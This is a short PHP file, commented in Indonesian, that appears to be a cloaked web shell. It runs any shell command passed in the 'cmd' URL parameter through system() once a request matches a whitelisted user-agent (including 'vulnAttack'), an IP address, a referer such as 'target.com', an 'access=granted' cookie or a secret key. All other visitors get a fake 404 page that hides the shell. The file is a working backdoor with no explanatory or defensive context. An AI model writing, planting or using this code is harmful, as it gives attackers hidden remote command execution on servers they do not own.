<?php
// ================================================================
// HIDDEN PLUS - Multi-condition access (FIXED)
// ================================================================

// Baca konfigurasi dari file (opsional)
$config_file = 'hidden_config.json';
if (file_exists($config_file)) {
    $config = json_decode(file_get_contents($config_file), true);
} else {
    // Default config
    $config = [
        'allowed_ua' => ['vulnAttack', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.1; Trident/6.0; IEMobile/11.0)'],
        'allowed_ip' => ['127.0.0.1', '::1', '192.168.1.100'],
        'allowed_referer' => ['http://localhost', 'https://localhost', 'https://target.com'],
        'secret_key' => 'your_secret_key'
    ];
}

$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$ref = $_SERVER['HTTP_REFERER'] ?? '';

$access = false;

// Cek User-Agent
if (in_array($ua, $config['allowed_ua'])) $access = true;
// Cek IP
if (in_array($ip, $config['allowed_ip'])) $access = true;
// Cek Referer
if (in_array($ref, $config['allowed_referer'])) $access = true;
// Cek Cookie
if (isset($_COOKIE['access']) && $_COOKIE['access'] === 'granted') $access = true;
// Cek GET key
if (isset($_GET['key']) && $_GET['key'] === $config['secret_key']) $access = true;

if ($access && isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    header('HTTP/1.0 404 Not Found');
    echo '<h1>404 Not Found</h1>';
}
?>